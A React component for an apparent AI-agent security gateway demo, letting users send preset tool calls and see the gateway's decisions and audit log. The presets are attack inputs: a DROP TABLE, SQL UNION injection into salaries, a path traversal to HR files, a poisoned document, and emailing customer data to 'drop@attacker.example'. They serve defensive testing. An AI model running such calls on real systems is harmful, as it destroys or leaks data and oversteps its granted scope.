"use client";

import { useState } from "react";
import GatewayCard from "./GatewayCard";
import { DECISION_STYLE, type Audit, type Check } from "./types";

const KEYS: Record<string, string> = { "support-bot": "sk_demo_support", "analytics-bot": "sk_demo_analytics", "intern-bot": "sk_demo_intern", "no key": "" };
const PRESETS: { label: string; agent: string; tool: string; args: object }[] = [
  { label: "SQL: drop a table", agent: "analytics-bot", tool: "db.query", args: { sql: "DROP TABLE customers" } },
  { label: "SQL: sneak into salaries", agent: "analytics-bot", tool: "db.query", args: { sql: "SELECT name FROM customers UNION SELECT title FROM salaries" } },
  { label: "SQL: legit revenue query", agent: "analytics-bot", tool: "db.query", args: { sql: "SELECT country, sum(mrr) AS mrr FROM customers GROUP BY country" } },
  { label: "PII via alias", agent: "analytics-bot", tool: "db.query", args: { sql: "SELECT email AS contact FROM customers" } },
  { label: "Path traversal to HR", agent: "support-bot", tool: "files.read", args: { path: "handbook/../hr/salaries.csv" } },
  { label: "Poisoned document", agent: "support-bot", tool: "files.read", args: { path: "vendors/acme-invoice.txt" } },
  { label: "Exfiltrate by email", agent: "support-bot", tool: "email.send", args: { to: "drop@attacker.example", subject: "customers", body: "list attached" } },
  { label: "Refund 2,400 USD", agent: "support-bot", tool: "payments.refund", args: { customer_id: "C-105", amount: 2400, reason: "please" } },
  { label: "Intern escalates scope", agent: "intern-bot", tool: "payments.refund", args: { customer_id: "C-101", amount: 50, reason: "test" } },
  { label: "No API key", agent: "no key", tool: "files.read", args: { path: "handbook/refund-policy.md" } },
];
const TOOLS = ["crm.search_customers", "crm.get_customer", "db.query", "files.read", "email.send", "payments.refund", "admin.grant_scope"];

type Resp = { decision: string; reason: string; checks: Check[]; result: any; flags?: string[]; audit: Audit[]; state: string };

export default function Playground() {
  const [agent, setAgent] = useState("analytics-bot");
  const [tool, setTool] = useState("db.query");
  const [args, setArgs] = useState(JSON.stringify({ sql: "DROP TABLE customers" }, null, 2));
  const [resp, setResp] = useState<Resp | null>(null);
  const [state, setState] = useState<string | null>(null);
  const [audit, setAudit] = useState<Audit[]>([]);
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  const [sent, setSent] = useState<{ tool: string; args: Record<string, unknown> } | null>(null);

  async function send() {
    let parsed: Record<string, unknown>;
    try { parsed = JSON.parse(args); } catch { setError("Arguments must be valid JSON."); return; }
    setBusy(true); setError("");
    try {
      const res = await fetch("/api/py/call", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ api_key: KEYS[agent], tool, args: parsed, state }) });
      const d = await res.json();
      if (!res.ok) { setError(d.error || "Request failed."); return; }
      setResp(d); setState(d.state); setAudit(d.audit); setSent({ tool, args: parsed });
    } catch { setError("The gateway could not be reached."); } finally { setBusy(false); }
  }

  return (
    <div className="grid gap-6 lg:grid-cols-[minmax(0,0.9fr)_minmax(0,1.1fr)]">
      <div className="panel flex flex-col gap-4 p-5">
        <div className="flex items-center justify-between"><p className="eyebrow">Send a raw tool call</p><span className="flex items-center gap-1.5 font-mono text-[11px] text-ok"><span className="h-1.5 w-1.5 rounded-full bg-ok" />real gateway · no AI needed</span></div>
        <div className="flex flex-wrap gap-1.5">
          {PRESETS.map((p) => <button key={p.label} type="button" onClick={() => { setAgent(p.agent); setTool(p.tool); setArgs(JSON.stringify(p.args, null, 2)); }} className="rounded-lg border border-line-2 px-2.5 py-1 text-[12px] hover:border-ice hover:text-ice">{p.label}</button>)}
        </div>
        <div className="grid gap-3 sm:grid-cols-2">
          <label className="flex flex-col gap-1 text-[13px]"><span className="text-muted">Agent (API key)</span><select value={agent} onChange={(e) => setAgent(e.target.value)} className="rounded-xl border border-line-2 bg-panel px-3 py-2.5">{Object.keys(KEYS).map((k) => <option key={k}>{k}</option>)}</select></label>
          <label className="flex flex-col gap-1 text-[13px]"><span className="text-muted">Tool</span><select value={tool} onChange={(e) => setTool(e.target.value)} className="rounded-xl border border-line-2 bg-panel px-3 py-2.5 font-mono text-[13px]">{TOOLS.map((t) => <option key={t}>{t}</option>)}</select></label>
        </div>
        <label className="flex flex-col gap-1 text-[13px]"><span className="text-muted">Arguments (JSON)</span><textarea rows={6} value={args} onChange={(e) => setArgs(e.target.value)} spellCheck={false} className="resize-none rounded-xl border border-line-2 bg-panel px-3 py-2.5 font-mono text-[12.5px] outline-none focus:border-ice" /></label>
        <button type="button" disabled={busy} onClick={send} className="btn btn-primary self-start disabled:opacity-50">{busy ? "Checking…" : "Send through the gateway"}</button>
        {error && <p role="alert" className="text-[13px] text-coral">{error}</p>}
      </div>
      <div className="dark-zone flex min-h-[460px] flex-col gap-4 rounded-3xl border border-line bg-ink p-5">
        {resp && sent ? <GatewayCard tool={sent.tool} args={sent.args} decision={resp.decision} reason={resp.reason} checks={resp.checks} result={resp.result} flags={resp.flags} /> : <p className="m-auto max-w-[36ch] text-center font-mono text-[12px] text-dim">Pick an attack above, or write your own call, and send it.</p>}
        {audit.length > 0 && (
          <div className="mt-auto">
            <p className="mb-2 font-mono text-[11px] uppercase tracking-wider text-dim">Audit log · this session</p>
            <ol className="flex max-h-48 flex-col gap-1 overflow-y-auto">
              {[...audit].reverse().map((a) => <li key={a.seq} className="flex items-center justify-between gap-2 font-mono text-[11px]"><span className="truncate text-muted">#{a.seq} {a.agent} → {a.tool}</span><span className={`shrink-0 rounded-full border px-2 py-0.5 text-[9.5px] ${DECISION_STYLE[a.decision]}`}>{a.decision.replace("_", " ")}</span></li>)}
            </ol>
          </div>
        )}
      </div>
    </div>
  );
}
